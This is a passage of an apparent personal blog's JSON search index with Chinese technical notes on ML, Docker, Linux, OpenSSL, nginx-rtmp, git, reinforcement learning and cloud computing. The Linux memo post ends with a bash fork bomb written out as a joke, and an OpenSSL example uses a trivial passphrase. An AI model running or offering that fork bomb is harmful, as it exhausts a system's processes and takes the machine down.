123输入层：接受来自网络外部的数据的顶点隐藏层：除了输入层和输出层以外的其他层输出层：向网络外部输出数据的顶点 超参数有哪些 如何衡量你的预测算法，损失函数loss 感知机是啥 BP是啥 RBF是啥 hopfield是啥 SOM是啥 计算隐藏层结点数目 12隐层结点数s与模式数N的关系是：s＝log2N；隐层结点数s＝2n＋1（n为输入层结点数）； CNN LSTM 聚类 1234567891011优点1.原理简单，实现方便，收敛速度快；2.聚类效果较优；3.模型的可解释性较强；4.调参只需要簇数k；缺点：1.k的选取不好把握；2.初始聚类中心的选择；3.如果数据的类型不平衡，比如数据量严重失衡或者类别的方差不同，则聚类效果不佳；4.采用的是迭代的方法，只能得到局部最优解；5.对于噪声和异常点比较敏感。 聚类性能度量 外部指标 内部指标 12外：聚类结果与某个“参考模型”(reference model) 进行比较，需要标记数据如Jaccard 系数，FM 指数，Rand 指数内：直接考察聚类结果而不用任何参考模型，类内聚集程度和类间离散程度。定义簇内样本间的距离，簇间距离，如DB 指数，Dunn 指数等","categories":[{"name":"复习","slug":"复习","permalink":"http://waynamigo.github.io/categories/复习/"}],"tags":[{"name":"ML","slug":"ML","permalink":"http://waynamigo.github.io/tags/ML/"}]},{"title":"这学期项目中的坑","slug":"2019-06-12-项目坑","date":"2019-06-11T16:00:00.000Z","updated":"2021-07-20T01:40:29.679Z","comments":true,"path":"2019/06/12/2019-06-12-项目坑/","link":"","permalink":"http://waynamigo.github.io/2019/06/12/2019-06-12-项目坑/","excerpt":"佛了","text":"佛了 mysql分离 + springboot + eurake123456原因是 配置远程数据库时，springboot 没有创建表，自己手动建了hibernate sequence后就会报这个错。表现为插入数据失败，error &quot;could not read a hi value - you need to populate the table&quot;.解决方法是对nextval设置初始值，stackoverflow的另一种方案是改掉注释@GeneratedValue(strategy = GenerationType.AUTO)改为@GeneratedValue(strategy = GenerationType.IDENTITY)","categories":[{"name":"java","slug":"java","permalink":"http://waynamigo.github.io/categories/java/"}],"tags":[{"name":"mysql","slug":"mysql","permalink":"http://waynamigo.github.io/tags/mysql/"},{"name":"Spring","slug":"Spring","permalink":"http://waynamigo.github.io/tags/Spring/"}]},{"title":"jekyll加入live2d的模型","slug":"2019-05-14-jekyll加入live2d模型","date":"2019-05-13T16:00:00.000Z","updated":"2021-07-20T01:50:03.281Z","comments":true,"path":"2019/05/14/2019-05-14-jekyll加入live2d模型/","link":"","permalink":"http://waynamigo.github.io/2019/05/14/2019-05-14-jekyll加入live2d模型/","excerpt":"由于不打算再迁到hexo了，把jekyll加入live2d模型的方法记录一下2019-8-1: 迁hexo了。","text":"由于不打算再迁到hexo了，把jekyll加入live2d模型的方法记录一下2019-8-1: 迁hexo了。 安装hexonpm install hexo-cli 使用hexo初始化一个本地的博客文件夹 hexo init 安装需要的依赖 npm install就可以了 在hexo安装live2d插件1yarn add hexo-helper-live2d 详见 hexo-helper-live2d 在hexo配置一下在config里面加入live2d的配置 12345678910111213141516171819hexo-helper-live2d项目给的配置文件例子live2d: model: scale: 1 hHeadPos: 0.5 vHeadPos: 0.618 display: superSample: 2 width: 150 height: 300 position: right hOffset: 0 vOffset: -20 mobile: show: true scale: 0.5 react: opacityDefault: 0.7 opacityOnHover: 0.2 找你要加入的live2d模型（有钱的可以去订做，把widget替换掉。 koharu在这里面live2d-widget-model clone所需要的live2d模型后，还需要在config里面加入一个live2d配置。 配置文件如下（注释是wife还行） 123456789101112#wifelive2d: enable: true pluginModelPath: assets/ model: use: koharu #模板目录，在node_modules里 display: position: right width: 150 height: 300 mobile: show: false 启动hexo，会自动编译生成可用的模型文件目的文件live2d文件夹，编译后的文件目录如下 12_config.yml live2d_models package.json scaffolds themesdb.json node_modules public source 在index中找一个js标签，加入到jekyll的需要加的layout文件中就可以直接用了12&lt;script src=\"/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887\"&gt;&lt;/script&gt;&lt;script&gt;L2Dwidget.init(&#123;\"pluginModelPath\":\"assets/\",\"model\":&#123;\"jsonPath\":\"/live2dw/assets/koharu.model.json\"&#125;,\"display\":&#123;\"position\":\"right\",\"width\":150,\"height\":300&#125;,\"mobile\":&#123;\"show\":false&#125;,\"log\":false,\"pluginJsPath\":\"lib/\",\"pluginRootPath\":\"live2dw/\",\"tagMode\":false&#125;);&lt;/script&gt;","categories":[{"name":"其他","slug":"其他","permalink":"http://waynamigo.github.io/categories/其他/"}],"tags":[{"name":"live2d","slug":"live2d","permalink":"http://waynamigo.github.io/tags/live2d/"}]},{"title":"软件工程经济学","slug":"2019-05-04-软件工程经济学","date":"2019-05-03T16:00:00.000Z","updated":"2021-07-20T01:53:00.242Z","comments":true,"path":"2019/05/04/2019-05-04-软件工程经济学/","link":"","permalink":"http://waynamigo.github.io/2019/05/04/2019-05-04-软件工程经济学/","excerpt":"from 华南理工大学 左保和老师软件项目如何进行融资、分析风险、敏感性因素等","text":"from 华南理工大学 左保和老师软件项目如何进行融资、分析风险、敏感性因素等 软件工程经济学基础总览12345678910requirementdesignconstructure 详细设计和总体设计在design完成，testingmaintenanceconfigure management，软件团队的管理办法management tools and methodengineering processquality 货币的时间成本，举例说明这个概念的重要性1、货币时间成本按利率衡量特定时间内 ，利息/借贷资本 利息计算方法12单利 I = iP N ==&gt; 利率*存款*计息周期数复利 F = P（1+i）^N 掌握的重要概念part1利率、利息额、借贷资本总额通货膨胀率、消费者价格指数（CPI）、生产者价格指数（PPI）利息的计算方法：单利、复利、计息期（一般为年，或换算为年）等值计算的概念和意义（现值、折现率）等额支付（等额本金、等额本息）税收、营业税、增值税、营改增贬值、折旧 工程经济学的概念工程经济学是运用有效的方法对工程各种因素进行评价，确定最佳方案，做出投资决策的学科，的研究对象是工程项目。对软件工程领域来说， 金融学明确目标周期机构商业战略 管理现今流量管理 会计学原理资产对外投资固定资产货币资金收入费用利润 现金流量现金的定义 指企业的库存现金和银行存款，还包括现金等价物，即企业持有的期限短、流动性强、容易转换为已知金额现金、价值变动风险很小的投资等 一项投资被确认为现金等价物必须同时具备四个条件：期限短、流动性强、易于转换为已知金额现金、价值改动风险小。 是企业财力的评价指标之一 现金流量图12345678910现金流入流出|||||_________________| 时间,指财务周期||| 支付方式等额支付 线性梯度支付p=G{}几何梯度支付第二年 = 第一年* (1+G) 通货膨胀纸币的发行量超过了流通中实际需要的数量，多余的部分继续在流通中流转，就会造成通货膨胀（百度百科） 折现衡量现金流量，税收， 税收营业 教育 增值 基准收益率与利率的区别基准收益率也被称为基准折现率。区别1：和利率不同，利率是资金利息额与借贷资金额的比率；收益率是投资的回报率，利润占使用平均资金的百分比。区别2：基准收益率是企业或行业或投资者以动态的观点所确定的、可接受的投资项目最低标准的受益水平，由国家发改委和建设部制定。基准利率由中国人民银行制定。区别3：上节讲的通货膨胀、利息等宏观因素是影响利率的主要因素；而对收益率来说，商品的生产率、运维生产率，投资，不确定度、消费者的消费偏好、投资风险、物价变动等因素是主要因素，并且根据每个行业的行情变动相对利率较大。软件行业的基准收益率是15%。 发改委官网、国家统计局官网上找不到数据，在材料《建设项目经济评价方法与参数》上有对各行业经济的各项参数的详细介绍 部分数据参照“北京软件造价评估技术创新联盟”网站的报告，包括2016-2018年，2018中国软件行业基准数据报告 cpi ， spiCPI=EV/AC，SPI=EV/PV cpi 成本绩效指标甘特图 贬值进度计划进度控制指标spi &lt;1 进度落后 =1 按计划进行 &gt;1 超前进行开发者效率 软件项目质量ISO度量 软件质量保证制定推行软件工程质量标准研究 采用各种技术手段控制各种变更制定并执行测试计划按质量标准对软件质量进行度量组织各种技术评审会","categories":[{"name":"软件工程经济学","slug":"软件工程经济学","permalink":"http://waynamigo.github.io/categories/软件工程经济学/"}],"tags":[{"name":"其他","slug":"其他","permalink":"http://waynamigo.github.io/tags/其他/"}]},{"title":"备忘的一些操作","slug":"2019-04-17-备忘的一些烦人操作","date":"2019-04-16T16:00:00.000Z","updated":"2021-07-20T01:32:18.316Z","comments":true,"path":"2019/04/17/2019-04-17-备忘的一些烦人操作/","link":"","permalink":"http://waynamigo.github.io/2019/04/17/2019-04-17-备忘的一些烦人操作/","excerpt":"包括用linux自带openssl签postfix证书、流媒体证书按网上教程（找不到之类的问题，最后自己把证书试出来了，见第一部分，还有博客cdn换成tx云因为配置不一样导致好久没发现cdn没启用等尴尬的问题","text":"包括用linux自带openssl签postfix证书、流媒体证书按网上教程（找不到之类的问题，最后自己把证书试出来了，见第一部分，还有博客cdn换成tx云因为配置不一样导致好久没发现cdn没启用等尴尬的问题 证书ubuntu自带的openssl包含的证书和RSA密钥等，相当于一套封装的加密套件。 based on SSL&amp;TLS 生成常用key的指令如下（很久远了，之前记下的只有几个，以后更新） 如果没有的话可以下载包ca-certificates 123456789101112public:openssl rsa -in rsa_private.key -pubout -out rsa_public.keyprivate ase256加密:openssl genrsa -aes256 -passout pass:111111 -out rsa_aes_private.key 2048签postfix实现加密，关键的两步:由于Thawte_Premium_Server_CA.pem证书失效，在新的cacert包里面更换成thawte_Primary_Root_CA.pemcat /etc/ssl/certs/thawte_Primary_Root_CA.pem | sudo tee -a /etc/postfix/cacert.pem修改main.cf的smtp_tls_CAfile = /etc/postfix/cacert.pem，使用postmap生成用户名和密码的hash表重新加载/etc/init.d/postfix（postfix服务的jio本）就可以使用了 怪事情，opencv的cvtColor突然不能用，但是服务器上没问题 解决方法找了其他源。。1conda install --channel https://conda.anaconda.org/menpo opencv3 shell以前记的笔记(_ _)12345678开头加一句#!/bin/bash 说明是一个脚本变量不需要声明可以直接用变量取值的话加美元If while中条件注意空格变量赋值不加空格Echo重定向：如果需要变量值和字符串相连，加大括号。没写i自增导致死循环If后一定要写fi代表结束，汇编格式吼啊 一个技巧，似乎是以前在用别人写的caffe库的时候出现了这个问题，忘了报什么错了，不是记得很清楚 12345678910111213141516171819202122 在Linux下编程时，或者说在一个有很多头文件互相 include 的场景中，经常会遇到不清楚一个变量的完整类型定义的情况（因为有用 typedef 封装），从而有可能遇到编译出错。 例如在使用 stat 来读取文件属性的 i-node number 时，查看 stat 的手册，得知这个变量 st_ino 的变量类型是 ino_t，而我们不清楚 ino_t的准确定义究竟是什么。可以用如下方法：声明一个这样的变量即可。#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;unistd.h&gt;int main() &#123; ino_t blah; return 0;&#125;然后运行如下指令：gcc -E test.c | grep ino_t-E 选项的意思是：在预处理过程后结束并输出到标准输出。文档原文如下-E Stop after the preprocessing stage; do not run the compiler proper. The output is in the form of preprocessed source code, which is sent to the standard output. c文件生成的步骤 1C/C++文件经过预处理(preprocessing)、编译(compilation)、汇编(assembly)、和连接(linking)才能变成可执行文件。 查看已经建立的tcp链接数量，包括close_waite ,established,time_wait状态， 不会awk的时候感觉这是个什么东西orz 1netstat -n | awk &apos;/^tcp/ &#123;++S[$NF]&#125; END &#123;for(a in S) print a, S[a]&#125;&apos; 安装lua的时候 readline缺失1安装一下 libreadline-dev，或者readline-dev，版本不一样有哪个装哪个 树莓派摄像头（非dsi口） 可以这样 1mplayer -tv driver=v4l2:width=800:height=700:device=/dev/video1 tv:// python调用的时候使用PiCamera库或者cv库，PiCamera可以测试下能不能用，毕竟两行代码，做视觉还是用cv了 tx云cdn123配置cdn源站信息： 自有源站，waynamigo.github.io回源配置： 回源host，waynamigo.cn 发现使用shadowsocks还行，那个ssr扔了1sudo sslocal -c /etc/shadowsocks/config.json -d start sslocal 直接用apt安装shadowsocks 使用的流媒体搭建12345678910111213git clone https://github.com/arut/nginx-rtmp-module.gitwget http://nginx.org/download/nginx-1.8.1.tar.gz tar -zxvf nginx-1.8.1.tar.gz cd nginx-1.8.1 先安装一下依赖yum install pcre-develyum install zlib zlib-develyum install openssl openssl-devel./configure --prefix=/usr/local/nginx --add-module=../nginx-rtmp-module --with-http_ssl_module make make install /usr/local/nginx/conf/nginx.conf 1234567891011121314151617181920212223rtmp &#123; server &#123; listen 1935; #监听的端口 chunk_size 4000; application hls &#123; #rtmp推流请求路径 live on; hls on; hls_path /usr/share/nginx/html/hls; hls_fragment 5s; &#125; &#125; &#125; 修改server模块的location / &#123; root /usr/share/nginx/html; index index.html index.htm; &#125; git配置多用户.ssh/config 1234Host github.com HostName github.com IdentityFile ~/.ssh/id_rsa_qq User nanamya 1234567cd .git设置本项目的用户名和邮箱git config user.name \"yourname\"git config user.email \"youremail\"如果重设 则：git config --global --unset user.namegit config --global --unset user.email 如果还是8行，检查一下，正常的话会有如下提示，否则会有debug的信息ssh -vT git@github.com 提示Hi waynamigo! You’ve successfully authenticated, but GitHub does not provide shell access. 更换用户 作死小能手 :() { function :|:&amp; }; :","categories":[{"name":"其他","slug":"其他","permalink":"http://waynamigo.github.io/categories/其他/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://waynamigo.github.io/tags/Linux/"}]},{"title":"NeuralRecon for 3D reconstruction in real-time","slug":"2019-04-01-评估模型算法指标的计算","date":"2019-03-31T16:00:00.000Z","updated":"2021-06-24T03:22:12.945Z","comments":true,"path":"2019/04/01/2019-04-01-评估模型算法指标的计算/","link":"","permalink":"http://waynamigo.github.io/2019/04/01/2019-04-01-评估模型算法指标的计算/","excerpt":"","text":"","categories":[{"name":"深度学习","slug":"深度学习","permalink":"http://waynamigo.github.io/categories/深度学习/"}],"tags":[{"name":"ML","slug":"ML","permalink":"http://waynamigo.github.io/tags/ML/"},{"name":"DL","slug":"DL","permalink":"http://waynamigo.github.io/tags/DL/"},{"name":"Object Detection","slug":"Object-Detection","permalink":"http://waynamigo.github.io/tags/Object-Detection/"},{"name":"Segmentation","slug":"Segmentation","permalink":"http://waynamigo.github.io/tags/Segmentation/"}]},{"title":"docker笔记整理（二）","slug":"2019-03-27-docker笔记二","date":"2019-03-26T16:00:00.000Z","updated":"2021-07-20T01:30:27.103Z","comments":true,"path":"2019/03/27/2019-03-27-docker笔记二/","link":"","permalink":"http://waynamigo.github.io/2019/03/27/2019-03-27-docker笔记二/","excerpt":"咕","text":"咕 C dockerhub ： waynamigoLet’s try a first example. Here’s a dummy equation: RUD","categories":[{"name":"Docker","slug":"Docker","permalink":"http://waynamigo.github.io/categories/Docker/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://waynamigo.github.io/tags/docker/"}]},{"title":"docker笔记整理（一）","slug":"2019-03-21-docker笔记整理一","date":"2019-03-20T16:00:00.000Z","updated":"2019-07-14T10:01:13.427Z","comments":true,"path":"2019/03/21/2019-03-21-docker笔记整理一/","link":"","permalink":"http://waynamigo.github.io/2019/03/21/2019-03-21-docker笔记整理一/","excerpt":"基本使用方法","text":"基本使用方法 使用docker仓库 首先，docker的一个镜像是由多层组成的，每一层一个id，在pull的时候可以看到 以下面为例，imageID是镜像的唯一id，但是镜像的完整id是第三行的sha256哈希值，使用docker images 指令的时候，默认id的位数显示是截断的，可以后跟参数–no-trunc=true来显示全部 12345REPOSITORY TAG IMAGE IDubuntu latest 94e814e2efa8Digest: sha256:94e814e2efa8845d95b2112d54497fbad173e45121ce9255b93401392f538499从官方下载，默认 docker pull &lt;image&gt;:&lt;tag&gt;如果从第三方下载，需要在仓库前指定完整仓库地址（例如hub.c.163.com/public/&lt;image&gt;:&lt;tag&gt;） 如果感觉DockerHub慢的话，可以使用镜像代理 https://registry.docker-cn.com。 123456/etc/systemd/system/docker.service.d/http_proxy.conf [Service]Environment=\"HTTPS_PROXY=https://registry.docker-cn.com\"然后systemctl daemon-reload，先reload units，重新加载一下配置单元，再重启docker服务systemctlrestart docker 除了docker images，还有一个docker inspect &lt;image&gt;:&lt;tag&gt; 查看详细信息(json) docker history &lt;image&gt;:&lt;tag&gt;查看历史信息 12345678[ &#123; \"Id\": \"sha256:94e814e2efa8845d95b2112d54497fbad173e45121ce9255b93401392f538499\", \"RepoTags\": [ \"ubuntu:latest\" ] &#125;] 基本操作，搜索，删除，清理本地遗留文件，创建自己的镜像等 docker search搜索镜像，也是按关键字来的。（你搜docker search mysql可以搜到MariaDB docker image prune -f，强删本地垃圾。创建 基于本地已有镜像创建，docker commit，和git格式差不多 123456格式：docker commit -m 'message' -a 'authorname' &lt;changed imageid or name&gt; &lt;yourimage&gt;:&lt;tag&gt;docker commit -m 'add one file' -a 'waynamigo' c4b6b5b3e7d8 myimage:waynamigops:另外两个参数为-c 执行dockerfile，在后面整理-p 提交时暂停容器的进程 基于本地模板导入（只用了OpenVZ提供的一个linux模板搞了一下，准备有时间拿上学期的floppylinux的文件弄一个镜像 1cat &lt;filename&gt; | docker import - &lt;image&gt;:&lt;tag&gt;,后者为自定义的名字，导入成功后会显示镜像id 基于dockerfile创建镜像，下面是一个demo 1234567891011121314FROM centos #指定基镜像 MAINTAINER waynamigo #该镜像维护者的信息（我）COPY jdk1.8.0_79 jdk1.8.0_79 #从centos复制jdk，（竟然没有openjdk。。。还得配置环境变量ADD &lt;localfile&gt; # 跑了一个jar。。ENV JAVA_HOME=/jdk1.8.0_79ENV PATH=$JAVA_HOME/bin:$PATHENV CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jarEXPOSE 8080 #开放8080端口，其实不用写，因为jar里面已经把yml的配置打包好了ENTRYPOINT [\"java\",\"-jar\",\"/filename\"] 123docker build -t waynamigo:webapp .生成后就可以创建容器并运行了docker run -p localhost:8080:8080 --name webapp_running waynamigo:webapp 不放心的话可以进去康康123docker run -it waynamigo:webapp# 运行这个docker容器top # 看进程lsof -i:8080 # 或者看端口占用 保存镜像 导出到本地，格式类似gcc++ 1docker save &lt;image&gt;:&lt;tag&gt; -o xxx.tar 如果要重新导入，使用 12docker load -i xxx.tardocker load &lt; xxx.tar 上传镜像 还是git，docker push 1234先上传到本地仓库（误docker tag &lt;image&gt;:&lt;tag&gt; waynamigo/&lt;image&gt;:&lt;tag&gt;然后pushdocker push waynamigo/&lt;image&gt;:&lt;tag&gt;","categories":[{"name":"Docker","slug":"Docker","permalink":"http://waynamigo.github.io/categories/Docker/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://waynamigo.github.io/tags/docker/"}]},{"title":"学期项目-begining","slug":"2019-03-06-学期项目启动","date":"2019-03-05T16:00:00.000Z","updated":"2019-07-14T12:19:05.507Z","comments":true,"path":"2019/03/06/2019-03-06-学期项目启动/","link":"","permalink":"http://waynamigo.github.io/2019/03/06/2019-03-06-学期项目启动/","excerpt":"项目启动，本项目主要综合行为识别、目标检测、物体识别、文本情感分析进行开发.由于我负责行为识别和目标检测这一模块，只整理自己的工作内容","text":"项目启动，本项目主要综合行为识别、目标检测、物体识别、文本情感分析进行开发.由于我负责行为识别和目标检测这一模块，只整理自己的工作内容 Vision12Through image, video recognition, text recognition, thestudents&apos; words and deeds are processed by the system to determine whether it has adverse effects on public civilization. Environment Support Keras 2.0/2.2 Tensorflow 1.2 PytorchMain ReferencesI GET THE set of papers from HEREVIDEO TO TEXTIMAGE CAPTIONGET THE NAME FORM DETAIL F-CNNCVPRTwo-streamThe development of my Action-Recgnization module is based on Two Stream 《Two-StreamConvolutional Networks for Action Recognition in Videos》. Reasons of using Two-stream The Action-Recgnization is developed on the way of Two-Stream recent years,And researchers have come out many papers on IEEE SCI and others.but the main reason is that I did Video caption last year, both of them are Analyzing Video Infomation, I want try other algorithm to finish my project in higher quality(get higher score). ProcedureGraphviz using dot generate this picture12 the basic of Two-Stream is The Fusion of spatiotemporal information in a dual stream network.orThe KEY POINT is the better Fusion of spatial and temporal features The interaction between layers within a single network, such as ResNet/Inception. between dual-stream networks, including the exploration of different fusion methods. It is worth considering the structure of ResNet and connecting the dual-stream network. This project use the second method. Spatial networkIt mainly captures important object features in video frames. Time series networkboth of them : finetune the ImageNet Document-Quality AttributesEach contains: 12345678910.└── Avaliability(Quality Attributes eg.) ├── Scenario ├── Stimulus Source ├── Stimulus ├── Artifact ├── Environment ├── Response ├── Response measure └── Tactics Avaliability Performance Modifiability Usability Security Testability Scenario Can not identify bad behavior The exported files are shown well New demands&amp;Structural optimization Customers want to export statistics file easily and need a reliable data Databases is intruded Unit testing Stimulus Source System dependencies Customers Developers and Customers Customers Attackers Developers Stimulus Can’t solve information of the video Exporting operation Customers Runtime(?) Sql injection&amp;entitlement Unit testing each module Artifact whole system UI system UI DBMS Code Environment Windows/Linux x86_64/32 in Runtime environment Web browser Runtime environment Web browser Firewall&amp;Encryption Runtime environment Response Send a feedback to backend if can’t analyze the video from surveillance cameras;Retry if can’t export the list of score Export statistics files in 10s Extend and modify functions when come out a new demand Provide a easy-operated UI and reliable information Resist intrusion Each module passed the Test Cases Response measure within 5min;within 5s within 10s All modules is extensible and under the control of the evaluation indexs The satisfaction of user Database is protected Developers Tactics Retry Self-test Increase Resource Efficiency Split Module aaa warm backup Limit Non-determinism Project Details This project explores prominent action recognition models with UCF-101 dataset Perfomance of different models are compared and analysis of experiment results are provided To be continued","categories":[{"name":"深度学习","slug":"深度学习","permalink":"http://waynamigo.github.io/categories/深度学习/"}],"tags":[{"name":"paper","slug":"paper","permalink":"http://waynamigo.github.io/tags/paper/"}]},{"title":"强化学习DQN简介","slug":"2019-03-02-强化学习初步","date":"2019-03-01T16:00:00.000Z","updated":"2019-07-14T12:18:33.709Z","comments":true,"path":"2019/03/02/2019-03-02-强化学习初步/","link":"","permalink":"http://waynamigo.github.io/2019/03/02/2019-03-02-强化学习初步/","excerpt":"QLearing的算法目标是：达到reward最大的state（状态，以一个使用无监督学习环境的agent为例，自https://blog.csdn.net/qq_16234613/article/details/80268564","text":"QLearing的算法目标是：达到reward最大的state（状态，以一个使用无监督学习环境的agent为例，自https://blog.csdn.net/qq_16234613/article/details/80268564 概念理解1234预设值：首先将图中的每一条边预设reward，目标节点指向自己的邻接边的reward设100，其他设为0Q、R矩阵： 包括状态action和行为state，作为行列环境反馈: 对于每一次的episode （相当于迭代的东西），每一次尝试attemp，会根据反馈进行对网络更新环境更新. 1234567R+r*max_Q(32)基本规则如下：Q表内容为index--state（agent的位置），columns--action(行为集)Q表（记录行为值）的计算规则是每次对于行为集合中的每一个action，对其进行计算、并进行选择。每一次episode，Q表更新一次定义EPSILON的目的是控制贪婪程度，其中，它可以随着时间推移 逐渐增加，贪婪) 主循环：图示 首先要对其评估和更新准则进行确定，代码中表示可以直接定义在一个结构中。 12345678910111213def update_env(S, episode, step_counter): # This is how environment be updated env_list = ['-']*(N_STATES-1) + ['T'] # '---------T' our environment if S == 'terminal': interaction = 'Episode %s: total_steps = %s' % (episode+1, step_counter) print('\\r&#123;&#125;'.format(interaction), end='') time.sleep(2) print('\\r ', end='') else: env_list[S] = 'o' interaction = ''.join(env_list) print('\\r&#123;&#125;'.format(interaction), end='') time.sleep(FRESH_TIME) demo,参考莫烦python的一个例子预先设置的参数，就是上述的预设值，其中gamma参数是作为奖励递减值，作用见后文代码，它是 123456N_STATES = #1维宽度ACTIONS = #动作集合EPSILON = #greedy贪婪值ALPHA = # learning rate 学习率GAMMA = # discount factor 奖励递减值MAX_EPISODES = # maximum episodes 最大回合数 Q表的行和列存储action和state，它的Value 每一次更新就是更新它的行为准则 123456def build_q_table(n_states, actions): table = pd.DataFrame( np.zeros((n_states, len(actions))), columns=actions, ) return table","categories":[{"name":"Reinforcement Learing","slug":"Reinforcement-Learing","permalink":"http://waynamigo.github.io/categories/Reinforcement-Learing/"}],"tags":[{"name":"paper","slug":"paper","permalink":"http://waynamigo.github.io/tags/paper/"},{"name":"DQN","slug":"DQN","permalink":"http://waynamigo.github.io/tags/DQN/"}]},{"title":"解决软件源更新，旧版本软件应用无法使用的问题","slug":"2019-01-17-网易云音乐修改deb依赖","date":"2019-01-16T16:00:00.000Z","updated":"2019-07-14T10:12:18.585Z","comments":true,"path":"2019/01/17/2019-01-17-网易云音乐修改deb依赖/","link":"","permalink":"http://waynamigo.github.io/2019/01/17/2019-01-17-网易云音乐修改deb依赖/","excerpt":"简单的修改官方deb依赖的操作例子，以修改网易云音乐debian包为例","text":"简单的修改官方deb依赖的操作例子，以修改网易云音乐debian包为例 查看软件包里的文件内容(不必要，只是避免好久不用忘了参数1dpkg -c neteasemusic.deb 用dpkg解压1将软件包中的文件释放到extracted目录下 1dpkg-deb -x neteasemusic.deb extracted/ 解压deb包中DEBIAN目录下的文件1将主控信息解压，control中包括了所有依赖 dpkg创建包的时候，依赖的控制信息在DEBIAN文件夹中，所以首先要创建一个DEBIAN文件夹（大写 否则会出现错误 1dpkg-deb: error: failed to open package info file 'build//DEBIAN/control' for reading: No such file or directory 1dpkg-deb -e neteasemusic.deb extracted/DEBIAN 创建debian软件包1dpkg-deb -b extract/ ./ 参数如下123456789* -c：显示软件包中的文件列表；* -e：将主控信息解压；* -f：把字段内容打印到标准输出；* -x：将软件包中的文件释放到指定目录下；* -X：将软件包中的文件释放到指定目录下，并显示释放文件的详细过程；* -w：显示软件包的信息；* -l：显示软件包的详细信息；* -R：提取控制信息和存档的清单文件；* -b：创建debian软件包。","categories":[{"name":"其他","slug":"其他","permalink":"http://waynamigo.github.io/categories/其他/"}],"tags":[{"name":"debian","slug":"debian","permalink":"http://waynamigo.github.io/tags/debian/"},{"name":"dpkg","slug":"dpkg","permalink":"http://waynamigo.github.io/tags/dpkg/"}]},{"title":"云计算复习","slug":"2019-01-08-云计算","date":"2019-01-07T16:00:00.000Z","updated":"2019-07-14T12:18:19.308Z","comments":true,"path":"2019/01/08/2019-01-08-云计算/","link":"","permalink":"http://waynamigo.github.io/2019/01/08/2019-01-08-云计算/","excerpt":"云计算概论","text":"云计算概论 绪论12* 云计算的定义* 云计算的人群 云计算的特征1234567超大规模高可扩展性虚拟化高可靠性通用性廉价性灵活定制 云计算的优点 虚拟化技术 动态可扩展 按需部署 高灵活性 高可靠性 高性价比 优点 缺点 降低用户计算机的成本 要求持续的网络连接 改善性能 低带宽网络连接环境下不能很好地工作 降低IT基础设施投资 反应慢 减少维护问题 减少软件开支 即时的软件更新 计算能力的增长 功能有限制 无限的存储能力 增强的数据安全性 无法确保数据的安全性 改善操作系统的兼容性 改善文档格式的兼容性 不能保证数据不会丢失 简化团队协作 没有地点限制的数据获取 绿色计算思想的实现者 分类服务类型： 基础设施、平台、应用部署范围： 公有、私有、混合 并行计算、分布式计算、网格计算属于计算科学 云计算、效用计算属于计算模式、商业模式与网格计算的区别： 网格是共享资源、协同计算，是一种资源共享模型。 而云计算采用网络将集群资源连接在一起，单向提供给用户资源进行数据处理。 资源调度模式 ：云计算以数据为中心，采用集群存储管理资源；网格计算以计算为中心，资源分布在各地。云计算进一步将硬件虚拟化。云计算体系结构IaaS、PaaS、SaaS infrastructure asa service： 硬件 资源 platform asa service： 软件环境 software asa service：应用程序 云存储结构 GFS (Google File System) HDFS(Hadoop Distributed File System) 存储层 基础管理层 应用接口层 访问层云计算技术体系结构 物理资源层：计算机、存储器、网络设施、数据库、软件 资源池层：将大量相同类型的资源构成资源池 管理中间件层： 资源管理、任务管理、用户管理、安全管理 SOA(Service-Oriented Architecture）构建层：将云计算能力封装成标准的Web Services 云计算的两条底层技术路线 分布式计算：把一个任务分解成多个小人物，在不同的服务器进行计算，整合计算资源 虚拟化：提供Iaas虚机，分割计算资源 VMM的分类 VMM(virtual machine monitor)虚拟化核心软件管理虚拟环境、管理物理资源 所谓虚拟化，是指通过虚拟化技术将一台计算机虚拟为多台逻辑计算机 123虚拟化就是由位于下层的软件模块,通过向上一层软件模块提供一个与它原先所期待的运行环境 完全一致 的接口的方法,抽象出一个虚拟的软件或硬件接口,使得上层软件可以直接运行在虚拟环境上。 虚拟化的优点:封装(逻辑化)\\多实例–计算资源的充分利用率、绿色节能、降低成本\\隔离\\硬件兼容\\虚拟化层特权 虚拟化的缺点:性能错误安全影响复杂：虚拟化层的引入增加了系统出错层面(如有些驱动无法加载) 虚拟平台：完全虚拟化 半虚拟化 实现结构 ：Hypervisor模型宿主模型混合模型 IO虚拟化 发现虚拟设备 虚机加载驱动，通过vmm提供的后端接口驱动设备 后端驱动程序调用物理驱动程序管理物理IO设备 设备模型指VMM中进行设备模拟,并处理所有设备请求和响应的逻辑模块 ssh原理 客户端向服务器端发出连接请求 服务器端向客户端发出自己的公钥 客户端使用服务器端的公钥加密通讯密钥然后发给服务器端 如果通讯过程被截获,由于窃听者即使获知公钥和经过公钥加密的内容,但不拥有私钥依然无法解密(RSA算法) 服务器端接收到密文后,用私钥解密,获知通讯密钥 ssh-keygen命令给服务器端产生公私钥密钥对 Hadoop HDFS NameNode DataNode 事务日志 映像文件 SecondaryNameNode 读取数据流程 12345客户端要访问HDFS中的一个文件首先从namenode获得组成这个文件的数据块位置列表根据列表知道存储数据块的datanode访问datanode获取数据Namenode并不参与数据实际传输 冗余副本策略,所有数据块都有副本 心跳机制，保证数据一致性 机架策略 Hbase HBase是一个分布式的、面向列的开源数据库 适合于非结构化数据存储的数据库 行键是数据行在表里的唯一标识 123* 以表的形式存放数据* 表由行与列组成,每个列属于某个列族,由行和列确定的存储单元称为元素* 每个元素保存了同一份数据的多个版本,由时间戳来标识区分 列表示为&lt;列族&gt;:&lt;限定符&gt; Hbase在磁盘上按照列族存储数据,这种列式数据库的设计非常适合于数据分析 列族里的元素最好具有相同的读写方式(例如等长的字符串),以提高性能，可压缩 docker 把Linux的cgroup、namespace,chroot等容器底层技术进行封装抽象,为用户提供了创建和管理容器的便捷界面","categories":[{"name":"复习","slug":"复习","permalink":"http://waynamigo.github.io/categories/复习/"}],"tags":[{"name":"review","slug":"review","permalink":"http://waynamigo.github.io/tags/review/"},{"name":"Cloud 